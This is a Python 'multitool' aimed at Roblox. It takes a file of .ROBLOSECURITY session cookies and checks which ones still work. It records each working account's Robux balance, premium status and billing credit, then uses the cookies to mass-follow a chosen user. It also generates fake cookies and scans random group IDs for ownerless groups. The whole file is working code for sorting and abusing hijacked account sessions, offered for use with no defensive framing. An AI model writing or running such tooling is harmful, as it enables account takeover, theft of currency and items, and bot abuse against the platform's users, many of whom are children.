from time import sleep


try:

    import requests
    import colorama
    import sys, os
    import time
    import random
    import string
    import threading
except:
    print('You dont have the required modules installed! Trying to install required modules..')
    try:
        import os
        os.system('cmd /k "pip install colorama --quiet"')
        os.system('cmd /k "pip install time --quiet"')
        os.system('cmd /k "pip install requests --quiet"')
        os.system('cmd /k "pip install random --quiet"')
        os.system('cmd /k "pip install string --quiet"')
        import colorama, time, requests, random, string, threading

    except:
        print('Pip is not installed! Please reinstall python with pip and restart the multitool!')

colorama.init(autoreset=True)
#Continung l8ter
session = requests.Session()

beginning = colorama.Fore.GREEN + """

  /$$$$$$                   /$$           /$$                   /$$/$$      /$$                  /$$      /$$
 /$$__  $$                 |__/          | $$                  | $| $$  /$ | $$                 | $$     | $$
| $$  \__/ /$$$$$$$ /$$$$$$ /$$ /$$$$$$ /$$$$$$   /$$$$$$  /$$$$$$| $$ /$$$| $$ /$$$$$$  /$$$$$$| $$ /$$$$$$$
|  $$$$$$ /$$_____//$$__  $| $$/$$__  $|_  $$_/  /$$__  $$/$$__  $| $$/$$ $$ $$/$$__  $$/$$__  $| $$/$$__  $$
 \____  $| $$     | $$  \__| $| $$  \ $$ | $$   | $$$$$$$| $$  | $| $$$$_  $$$| $$  \ $| $$  \__| $| $$  | $$
 /$$  \ $| $$     | $$     | $| $$  | $$ | $$ /$| $$_____| $$  | $| $$$/ \  $$| $$  | $| $$     | $| $$  | $$
|  $$$$$$|  $$$$$$| $$     | $| $$$$$$$/ |  $$$$|  $$$$$$|  $$$$$$| $$/   \  $|  $$$$$$| $$     | $|  $$$$$$$
 \______/ \_______|__/     |__| $$____/   \___/  \_______/\_______|__/     \__/\______/|__/     |__/\_______/
                              | $$                                                                           
                              | $$                                                                           
                              |__/                         

ROBLOX multitool                    Info: Dont put too much Cookies at once in the cookie file otherwise it'll lag!

"""

print(beginning)

cookie = open('cookies.txt', 'r').readline()

def delete_line():
    data = open("cookies.txt", "r").read().splitlines(True)
    open("cookies.txt", "w").writelines(data[1:])

def set_cookie():
    for line in open('cookies.txt', 'r').readlines():
        l = line.replace('\n', '')
    new_cookie = f'.ROBLOSECURITY={l}'
    headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
            'Cookie' : new_cookie
            }
    session.headers = headers
    token = session.post('https://auth.roblox.com', headers=headers)
    session.headers = token.headers

def check_cookie():
    if os.stat("cookies.txt").st_size == 0:
        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(2)
        print(beginning)
        menu()
    else:
        while os.stat("cookies.txt").st_size != 0:
            time.sleep(0.2)
            set_cookie()
            try:
                set_cookie()
                r = session.get('https://api.roblox.com/currency/balance').json()
                try:
                    if r['errors']:
                        print(colorama.Fore.RED + 'Not working')
                        delete_line()
                        if os.stat(os.path.join(sys.path[0], "cookies.txt")).st_size == 0:
                            print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
                            menu()
                except KeyError:
                    print(colorama.Fore.GREEN + 'Working')
                    open(os.path.join(sys.path[0], "working.txt"), "a").write('\n' + cookie + ' | Checked with ScriptedWorlds ROBLOX multitool')
                    delete_line()
                    if os.stat("cookies.txt").st_size == 0:
                        print(colorama.Fore.RED + 'Finished! Returning to menu..')
                        time.sleep(2)
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(beginning)
                        menu()
            except ValueError:
                print(colorama.Fore.RED + 'Invaild Cookie')
                delete_line()
                if os.stat("cookies.txt").st_size == 0:
                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
                    time.sleep(2)
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(beginning)
                    menu()
                else:
                    check_cookie()

def robux_checker():
    if os.stat("cookies.txt").st_size == 0:
        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(beginning)
        menu()
    else:
        while os.stat('cookies.txt').st_size != 0:
            time.sleep(0.2)
            set_cookie()
            try:
                set_cookie()
                r = session.get('https://api.roblox.com/currency/balance').json()
                try:
                    if r['errors']:
                        print(colorama.Fore.RED + 'Not working')
                        delete_line()
                        if os.stat("cookies.txt").st_size != 0:
                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
                            time.sleep(2)
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(beginning)
                            menu()
                except KeyError:
                    print(colorama.Fore.GREEN + 'Robux : ', r['robux'])
                    open(os.path.join(sys.path[0], "working.txt"), "a").write('\n' + cookie + ' | Robux: ' + str(r['robux']) + ' Checked with ScriptedWorlds ROBLOX multitool')
                    delete_line()
                    if os.stat("cookies.txt").st_size == 0:
                        print(colorama.Fore.RED + 'Finished! Returning to menu..')
                        time.sleep(2)
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(beginning)
                        menu()

            except ValueError:
                print(colorama.Fore.RED + 'Invaild Cookie')
                delete_line()
                if os.stat('cookies.txt').st_size == 0:
                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
                    time.sleep(2)
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(beginning)
                    menu()
                else:
                    robux_checker()

def credit_and_premium_checker():
    time.sleep(0.2)
    if os.stat('cookies.txt').st_size == 0:
        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(beginning)
        menu()

    else:
        while os.stat('cookies.txt').st_size != 0:
            set_cookie()
            try:
                r = session.get('https://billing.roblox.com/v1/paymentmethods?ap=3&_=1603642543474').json()
                user_id = session.get('http://www.roblox.com/mobileapi/userinfo').json()
                try:
                    if r['errors']:
                        print(colorama.Fore.RED + 'Not working')
                        delete_line()
                        if os.stat("cookies.txt").st_size == 0:
                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
                            time.sleep(2)
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(beginning)
                            menu()
                        else:
                            credit_and_premium_checker()

                except KeyError:
                    print(colorama.Fore.GREEN + 'IsPremium: ' + str(user_id['IsPremium']) + ' |Credit: ' + str(r['currentCredit']) + '$' + ' |Allows Renewal: ' + str(r['allowCreditForRenewingPurchases']))
                    open("working.txt", "a").write('\n' + cookie + '| IsPremium: ' + str(user_id['IsPremium'])  + ' |Credit: ' + str(r['currentCredit']) + '$' + ' |Allows Renewal: ' + str(r['allowCreditForRenewingPurchases']) + ' |Checked with ScriptedWorlds ROBLOX multitool')
                    delete_line()
                    if os.stat("cookies.txt").st_size == 0:
                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
                            time.sleep(2)
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(beginning)
                            menu()

                    else:
                        credit_and_premium_checker()
            except ValueError:
                print(colorama.Fore.RED + 'Invaild Cookie')
                delete_line()
                if os.stat("cookies.txt").st_size == 0:
                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
                    time.sleep(2)
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(beginning)
                    menu()
                else:
                    credit_and_premium_checker()

        
def mass_follow():
    time.sleep(0.2)
    if os.stat("cookies.txt").st_size == 0:
        print(colorama.Fore.LIGHTYELLOW_EX + 'No cookies in file! Returning to menu...')
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(beginning)
        menu()

    else:
        follower = input('User-ID : ')
        while os.stat("cookies.txt").st_size != 0:
            set_cookie()
            try:
                payload = {
                    'followedUserId' : int(follower)
                }
                r = session.post('https://api.roblox.com/user/follow', data=payload).json()
                try:
                    if True in r.values():
                        print(colorama.Fore.GREEN + 'Following')
                        delete_line()
                        if os.stat("cookies.txt").st_size == 0:
                            print(colorama.Fore.RED + 'Finished! Returning to menu..')
                            time.sleep(2)
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(beginning)
                            menu()
                        else:
                            mass_follow()
                except KeyError:
                    print(colorama.Fore.RED + 'Not working')
                    delete_line()
                    if os.stat("cookies.txt").st_size == 0:
                        print(colorama.Fore.RED + 'Finished! Returning to menu..')
                        time.sleep(2)
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(beginning)
                        menu()
                    else:
                        mass_follow()

                    
            except ValueError:
                print(colorama.Fore.RED + 'Invaild Cookie')
                delete_line()
                if os.stat("cookies.txt").st_size == 0:
                    print(colorama.Fore.RED + 'Finished! Returning to menu..')
                    time.sleep(2)
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(beginning)
                    menu()
                else:
                    mass_follow()

def generate_cookies():
    number = int(input('How much cookies? : '))
    if number == 0:
        print(colorama.Fore.RED + 'Nice Try!')
        time.sleep(2)
        generate_cookies()
    else:
        while number > 0:
            if number == 0:
                print(colorama.Fore.RED + 'Finished! Returning to menu..')
                time.sleep(2)
                os.system('cls' if os.name == 'nt' else 'clear')
                print(beginning)
                menu()
                break
            number -= 1
            strings = string.ascii_uppercase + string.digits
            result = ''.join(random.choice(strings) for i in range(616))
            open("cookies.txt", "a").write('\n' + '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + result) # Not working at the moment
            print(number)
            if number == 0:
                print(colorama.Fore.RED + 'Finished! Returning to menu..')
                time.sleep(2)
                os.system('cls' if os.name == 'nt' else 'clear')
                print(beginning)
                menu()
                break

def group_scraper():
    print('Running.. This might take a while! Results will be posted here.')
    while True:
        id = ''.join(random.choice(string.digits) for i in range(8))
        group = requests.get('https://groups.roblox.com/v1/groups/' + id)
        if group.status_code == 200:
            if group.json()['owner'] == None and group.json()['publicEntryAllowed'] == True:
                    print(colorama.Fore.GREEN + "https://www.roblox.com/groups/" + str(id))

            else:
                pass

        elif group.status_code == 400:
            pass

        else:
            pass





def menu():
    choice = input('1) Cookie Checker\n2) Robux Checker\n3) Credit and Premium Checker\n4) Mass follow\n5) Cookie Generator\n6) Group scraper\nSelect: \n')
    if choice == '1':
        t = threading.Thread(target=check_cookie)
        t.start()
    elif choice == '2':
        t = threading.Thread(target=robux_checker)
        t.start()

    elif choice == '3':
        t = threading.Thread(target=credit_and_premium_checker)
        t.start()

    elif choice == '4':
        t = threading.Thread(target=mass_follow)
        t.start()

    elif choice == '5':
        t = threading.Thread(target=generate_cookies)
        t.start()

    elif choice == '6':
        t = threading.Thread(target=group_scraper).start()


def exit():
    input('Press any Key to exit')

menu()
